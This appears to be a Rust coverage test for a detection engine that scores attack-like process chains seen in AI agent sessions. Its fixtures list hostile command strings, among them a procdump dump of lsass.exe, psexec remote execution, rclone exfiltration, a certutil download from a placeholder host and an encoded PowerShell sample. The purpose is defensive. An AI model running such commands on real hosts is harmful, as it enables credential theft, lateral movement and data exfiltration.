use std::collections::{BTreeMap, BTreeSet};

use telltale_detect::process_chain::ProcessChainConfig;
use telltale_detect::v2::{
    RuleV1CompatibilityPlan, compile_rule_v1,
    event3::{Event3CompatibilityContext, project_event3},
    session::{CanonicalSourceInput, evaluate_source},
};
use telltale_rules::process_chain::{
    ChainRuleDefinition, CompiledProcessChainRules, ProcessChainPack, ProcessObservation,
    ProcessRef, StandaloneRuleDefinition, bundled_process_chain_yaml,
    load_default_process_chain_rules,
};
use telltale_schema::clients::ClientId;
use telltale_schema::observation::*;

#[derive(Debug, Clone)]
pub struct ProcessChainCoverage {
    pub enabled_chain_count: usize,
    pub enabled_standalone_count: usize,
    pub enabled_correlation_count: usize,
    pub covered_chain_and_standalone_ids: BTreeSet<String>,
    pub covered_correlation_ids: BTreeSet<String>,
    pub canonical_atomic_ids: BTreeSet<String>,
    pub uncovered_ids: Vec<String>,
    pub rationales: BTreeMap<String, String>,
    pub evaluator_path: String,
    pub independent_scenario_tested_count: usize,
    pub independent_benign_scenario_count: usize,
    pub pipeline_integration: String,
}

// Fixed synthetic command contracts, independent of matcher output. Stronger
// structured parent relationships remain matcher conformance, not Tool efficacy.
const ATOMIC_CASES: &[(&str, &str, u64)] = &[
    ("cmd /c hostname", "procchain.discovery.cmd_hostname", 0),
    ("cmd /c whoami", "procchain.discovery.cmd_whoami", 20),
    ("cmd /c psexec", "procchain.lateral.psexec_remote_exec", 48),
    ("cmd /c 7za", "procchain.collection.cmd_7za", 40),
    ("cmd /c rclone", "procchain.exfil.cmd_rclone", 85),
    (
        "cmd /c procdump -ma lsass.exe C:\\temp\\out.dmp",
        "procchain.credaccess.credential_dump_command",
        85,
    ),
];

const CORRELATION_CASES: &[(&str, &[&str], u64)] = &[
    (
        "procchain.correlation.host_then_account_discovery",
        &["cmd /c hostname", "cmd /c whoami"],
        45,
    ),
    (
        "procchain.correlation.discovery_then_remote_exec",
        &["cmd /c whoami", "cmd /c psexec"],
        55,
    ),
    (
        "procchain.correlation.archive_then_cloud_transfer",
        &["cmd /c 7za", "cmd /c rclone"],
        65,
    ),
];

const UNOBSERVABLE_CORRELATIONS: &[(&str, &[&str])] = &[
    (
        "procchain.correlation.office_script_then_download",
        &[
            "winword.exe powershell.exe",
            "cmd /c certutil -urlcache -split -f https://example.invalid/a",
        ],
    ),
    (
        "procchain.correlation.webshell_then_discovery",
        &["w3wp.exe cmd.exe", "cmd /c whoami"],
    ),
    (
        "procchain.correlation.rmm_then_credential_or_evasion",
        &[
            "anydesk.exe powershell.exe",
            "cmd /c procdump -ma lsass.exe C:\\temp\\out.dmp",
        ],
    ),
];

pub fn evaluate_process_chain_coverage() -> Result<ProcessChainCoverage, String> {
    let pack: ProcessChainPack = serde_yaml::from_str(bundled_process_chain_yaml())
        .map_err(|error| format!("process-chain pack parse: {error}"))?;
    let rules = load_default_process_chain_rules().map_err(|error| error.to_string())?;
    let plan = compile_rule_v1(
        &telltale_rules::load_default_rule_set()
            .map_err(|e| e.to_string())?
            .compatibility_export(),
    )
    .map_err(|e| e.to_string())?;
    // Keep the original definition-backed matcher coverage, including parents
    // that Tool command extraction cannot observe. No Events are synthesized.
    let mut covered_chain_and_standalone_ids = BTreeSet::new();
    let mut enabled_chain_count = 0;
    let mut enabled_standalone_count = 0;
    for definition in &pack.rules {
        if !definition.enabled.unwrap_or(pack.defaults.enabled) {
            continue;
        }
        enabled_chain_count += 1;
        if matches_id(&rules, &chain_observation(definition), &definition.id) {
            covered_chain_and_standalone_ids.insert(definition.id.clone());
        }
    }
    for definition in &pack.standalone {
        if !definition.enabled.unwrap_or(pack.defaults.enabled) {
            continue;
        }
        enabled_standalone_count += 1;
        if matches_id(&rules, &standalone_observation(definition), &definition.id) {
            covered_chain_and_standalone_ids.insert(definition.id.clone());
        }
    }

    let mut canonical_atomic_ids = BTreeSet::new();
    for (command, id, score) in ATOMIC_CASES {
        let events = canonical_events(&rules, &plan, &[*command])?;
        require_event(&events, id, *score)?;
        canonical_atomic_ids.insert((*id).to_string());
    }
    let mut covered_correlation_ids = BTreeSet::new();
    for (id, commands, score) in CORRELATION_CASES {
        let events = canonical_events(&rules, &plan, commands)?;
        require_event(&events, id, *score)?;
        let event = events.iter().find(|e| e.rule_ids[0] == *id).unwrap();
        if event.risk_entity_type.as_deref() != Some("session") {
            return Err(format!(
                "{id}: canonical Tool evidence must remain session-scoped"
            ));
        }
        let supporting = event
            .evidence
            .iter()
            .find(|e| e.field == "correlated_event_ids")
            .ok_or_else(|| format!("{id}: missing correlation support"))?;
        if supporting.redacted_value.split(',').count() != 2
            || !supporting
                .redacted_value
                .split(',')
                .all(|id| events.iter().any(|e| e.event_id == id))
        {
            return Err(format!(
                "{id}: correlation must reference both projected atomic events"
            ));
        }
        // Equal timestamps are fixed in the fixture: reversing caller order
        // must not satisfy the forward sequence.
        let reversed = commands.iter().copied().rev().collect::<Vec<_>>();
        if canonical_events(&rules, &plan, &reversed)?
            .iter()
            .any(|e| e.rule_ids[0] == *id)
        {
            return Err(format!("{id}: reversed sequence unexpectedly correlated"));
        }
        covered_correlation_ids.insert((*id).to_string());
    }
    let mut rationales = BTreeMap::new();
    for (id, commands) in UNOBSERVABLE_CORRELATIONS {
        if canonical_events(&rules, &plan, commands)?
            .iter()
            .any(|e| e.rule_ids[0] == *id)
        {
            return Err(format!(
                "{id}: Tool command text invented a structured parent"
            ));
        }
        rationales.insert((*id).to_string(), "Requires a structured Office/web-server/RMM parent relationship unavailable from canonical Tool command evidence. Atomic matcher conformance and fixed shipped-correlation kernel tests retain rule coverage; canonical positive coverage awaits truthful Process evidence.".to_string());
    }
    let repeated = canonical_events(
        &rules,
        &plan,
        &["cmd /c whoami", "cmd /c whoami", "cmd /c whoami"],
    )?;
    require_event(&repeated, "procchain.discovery.cmd_whoami", 20)?;
    if !repeated.iter().any(|event| {
        event
            .evidence
            .iter()
            .any(|e| e.field == "repeat_count" && e.redacted_value == "3")
    }) {
        return Err("canonical process repeat count must be three".to_string());
    }
    if !canonical_events(&rules, &plan, &["git status", "ls -la"])?.is_empty() {
        return Err("benign POSIX commands unexpectedly matched process rules".to_string());
    }

    let all_enabled = pack
        .rules
        .iter()
        .filter(|d| d.enabled.unwrap_or(pack.defaults.enabled))
        .map(|d| d.id.clone())
        .chain(
            pack.standalone
                .iter()
                .filter(|d| d.enabled.unwrap_or(pack.defaults.enabled))
                .map(|d| d.id.clone()),
        )
        .chain(
            pack.correlations
                .iter()
                .filter(|d| d.enabled.unwrap_or(pack.defaults.enabled))
                .map(|d| d.id.clone()),
        )
        .collect::<BTreeSet<_>>();
    let covered = covered_chain_and_standalone_ids
        .iter()
        .chain(&covered_correlation_ids)
        .cloned()
        .collect::<BTreeSet<_>>();
    let uncovered_ids = all_enabled.difference(&covered).cloned().collect();
    Ok(ProcessChainCoverage {
        enabled_chain_count,
        enabled_standalone_count,
        enabled_correlation_count: pack.correlations.iter().filter(|d| d.enabled.unwrap_or(pack.defaults.enabled)).count(),
        covered_chain_and_standalone_ids,
        covered_correlation_ids,
        canonical_atomic_ids,
        uncovered_ids,
        rationales,
        evaluator_path: "canonical Tool observations -> evaluate_source -> Detection v2 process_results + process_chain_session -> project_event3; structured-only atomic definitions additionally use CompiledProcessChainRules::evaluate".to_string(),
        // These are conformance contracts, not independently labeled efficacy cases.
        independent_scenario_tested_count: 0,
        independent_benign_scenario_count: 0,
        pipeline_integration: "canonical_runtime_and_Pipeline_scan_root_use_Detection_v2_process_chain_session; direct_record_Rule_v1_compatibility_does_not".to_string(),
    })
}

fn canonical_events(
    rules: &CompiledProcessChainRules,
    plan: &RuleV1CompatibilityPlan,
    commands: &[&str],
) -> Result<Vec<telltale_schema::event::Event>, String> {
    let observations = commands
        .iter()
        .enumerate()
        .map(|(index, command)| {
            CanonicalObservationV2::builder(
                ObservationBody::Tool(
                    ToolObservation::new().with_arguments(JsonValue::string(*command)),
                ),
                ObservationStage::ToolRequested,
                ObservedAt::new("2026-06-01T00:01:00Z").unwrap(),
                SourceProvenance::new(
                    IngestionMode::SessionStore,
                    "codex",
                    "codex.sessions",
                    Fidelity::FullNative,
                )
                .unwrap()
                .with_native_id(format!("evaluation-command-{index}"))
                .unwrap(),
            )
            .session_id(CorrelationId::source_reported("evaluation-process-session").unwrap())
            .sequence(index as u64)
            .occurred_at(SourceTimestamp::new("2026-06-01T00:00:00Z").unwrap())
            .fact_metadata(
                "tool.arguments",
                FactMetadata::new(FactProvenance::Reported, Sensitivity::Normal).unwrap(),
            )
            .build()
            .unwrap()
        })
        .collect::<Vec<_>>();
    let instance = CorrelationId::source_reported("evaluation-process-source").unwrap();
    let evaluation = evaluate_source(
        CanonicalSourceInput {
            client: ClientId::Codex,
            source_id: "codex.sessions",
            source_instance: Some(&instance),
            observations: &observations,
        },
        plan,
        Some((rules, &ProcessChainConfig::default())),
    )
    .map_err(|e| e.to_string())?;
    let events = project_event3(
        &evaluation,
        &Event3CompatibilityContext {
            source_path_hash: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            sessions: &[],
        },
    )
    .map_err(|e| e.to_string())?
    .events
    .into_iter()
    .filter(|e| e.event_type == "process_chain")
    .collect::<Vec<_>>();
    for result in evaluation
        .sessions()
        .iter()
        .flat_map(|s| s.process_results())
    {
        if !events
            .iter()
            .any(|e| e.rule_ids[0] == result.detector().id())
        {
            return Err(format!(
                "{}: process result missing from Event3 projection",
                result.detector().id()
            ));
        }
    }
    Ok(events)
}

fn require_event(
    events: &[telltale_schema::event::Event],
    id: &str,
    score: u64,
) -> Result<(), String> {
    let matching = events
        .iter()
        .filter(|e| e.rule_ids[0] == id)
        .collect::<Vec<_>>();
    if matching.len() != 1 || matching[0].risk_score != score {
        return Err(format!(
            "{id}: expected one canonical event with score {score}, got {:?}",
            matching.iter().map(|e| e.risk_score).collect::<Vec<_>>()
        ));
    }
    Ok(())
}

fn matches_id(
    rules: &CompiledProcessChainRules,
    observation: &ProcessObservation,
    id: &str,
) -> bool {
    rules
        .evaluate(observation)
        .iter()
        .any(|d| d.rule_id == id || d.secondary_rule_ids.iter().any(|secondary| secondary == id))
}

fn chain_observation(definition: &ChainRuleDefinition) -> ProcessObservation {
    let command_line = if definition
        .id
        .starts_with("procchain.persistence.reg_run_key")
    {
        r"reg add currentversion\\run".to_string()
    } else {
        definition
            .child_command_line_any
            .first()
            .map(|pattern| format!("{} {}", definition.child, sample_from_pattern(pattern)))
            .unwrap_or_else(|| definition.child.clone())
    };
    let child = ProcessRef::named(&definition.child)
        .with_command_line(command_line)
        .with_path(
            definition
                .child_path_any
                .first()
                .map(|pattern| format!(r"C:\temp\{}", sample_from_pattern(pattern)))
                .unwrap_or_else(|| format!(r"C:\temp\{}.exe", definition.child)),
        );
    ProcessObservation {
        parent: ProcessRef::named(&definition.parent),
        child,
        host: Some("eval-host".to_string()),
        ..ProcessObservation::default()
    }
}

fn standalone_observation(definition: &StandaloneRuleDefinition) -> ProcessObservation {
    let mut child = ProcessRef::named("evaluation-process");
    match definition.r#match.as_str() {
        "process_name" => child.name = sample_from_pattern(&definition.patterns[0]),
        "process_path" => child.path = Some(r"C:\temp\evaluation.exe".to_string()),
        "command_line" => {
            child.name = "powershell".to_string();
            child.command_line = Some(command_line_sample(&definition.patterns[0]));
        }
        _ => {}
    }
    ProcessObservation {
        parent: ProcessRef::named("evaluation-parent"),
        child,
        host: Some("eval-host".to_string()),
        ..ProcessObservation::default()
    }
}

fn sample_from_pattern(pattern: &str) -> String {
    let mut sample = pattern
        .replace(r"\b", "")
        .replace(r"\s+", " ")
        .replace(r"\s*", " ")
        .replace(r"\s", " ")
        .replace(r"\S+", "x")
        .replace(r"\S", "x")
        .replace(".*", " evaluation ")
        .replace(".+", "evaluation")
        .replace(['^', '$'], "");
    while let Some(start) = sample.find('(') {
        let Some(relative_end) = sample[start..].find(')') else {
            break;
        };
        let end = start + relative_end;
        let selected = sample[start + 1..end]
            .trim_start_matches("?:")
            .split('|')
            .next()
            .unwrap_or("evaluation")
            .to_string();
        sample.replace_range(start..=end, &selected);
    }
    while let Some(start) = sample.find('[') {
        let Some(relative_end) = sample[start..].find(']') else {
            break;
        };
        let end = start + relative_end;
        sample.replace_range(start..=end, "x");
    }
    while let Some(start) = sample.find('{') {
        let Some(relative_end) = sample[start..].find('}') else {
            break;
        };
        let end = start + relative_end;
        sample.replace_range(start..=end, "");
    }
    sample = sample
        .replace(r"\\", r"\")
        .replace(r"\.", ".")
        .replace(r"\", "")
        .replace(['?', '+'], "")
        .replace('|', "");
    let sample = sample.trim();
    if sample.is_empty() {
        "evaluation".to_string()
    } else {
        sample.to_string()
    }
}

fn command_line_sample(pattern: &str) -> String {
    if pattern.contains("[A-Za-z0-9+/=]{16,}") {
        return "powershell -enc QUJDREVGR0hJSktMTU5PUA==".to_string();
    }
    sample_from_pattern(pattern)
}
